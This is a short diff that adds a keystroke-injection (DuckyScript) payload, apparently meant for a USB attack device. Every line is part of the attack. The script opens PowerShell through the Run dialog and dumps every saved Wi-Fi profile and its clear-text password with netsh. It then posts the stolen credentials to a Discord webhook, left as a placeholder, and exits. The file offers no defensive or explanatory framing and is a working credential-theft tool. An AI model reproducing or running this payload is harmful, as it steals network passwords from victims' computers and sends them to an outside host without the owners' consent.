@@ -1,0 +1,34 @@
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell.exe 
+DELAY 200
+ENTER
+DELAY 500
+STRING $webhookUrl = "your_discord_webhook_url"
+DELAY 200
+ENTER
+DELAY 200
+STRING $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+DELAY 200
+ENTER
+DELAY 200
+STRING $message = "Saved Wi-Fi Passwords:`n"
+DELAY 200
+ENTER
+DELAY 500
+STRING foreach ($profile in $profiles) { $profileInfo = netsh wlan show profile name="$profile" key=clear; $passwordLine = $profileInfo | Select-String "Key Content"; if ($passwordLine) { $message += "`nProfile: $profile`nPassword: $($passwordLine -replace '.*:\s*')`n" } else { $message += "`nProfile: $profile`nPassword: <No Password>`n" } }
+DELAY 200
+ENTER
+DELAY 200
+STRING $payload = @{content = $message} | ConvertTo-Json
+DELAY 200
+ENTER
+DELAY 200
+STRING Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
+DELAY 200
+ENTER
+DELAY 200
+STRING exit
+DELAY 200
+ENTER
